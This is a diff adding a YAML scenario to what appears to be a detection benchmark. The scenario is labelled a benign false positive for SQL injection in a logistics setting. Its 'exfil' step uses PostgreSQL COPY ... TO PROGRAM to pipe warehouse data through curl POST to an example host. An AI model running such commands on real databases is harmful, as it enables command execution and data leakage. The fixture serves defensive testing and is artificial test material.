@@ -1,0 +1,33 @@
+scenario_id: gen_logistics_92_sql_injection_ben_2627b
+family_id: gen_logistics_92_sql_injection_fam_2627
+domain: logistics
+time_of_day: '17:10'
+default_class: benign
+rule_engine_relationship: benign_false_positive
+sessions:
+- session_label: inject
+  role: partner_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 5.0
+  events:
+  - step_id: probe
+    sql: SELECT warehouse_id, name FROM warehouses WHERE shipment_id = 57351
+  - step_id: exfil
+    sql: COPY (SELECT warehouse_id, name FROM warehouses WHERE depot_id = 'DP-11')
+      TO PROGRAM 'curl -sX POST https://warehouse-sync.datasink.example/ingest -d
+      @-'
+    connects_to:
+      ip: 203.0.113.171
+      port: 9443
+matched_pair_id: gen_logistics_92_sql_injection_pair_2627
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
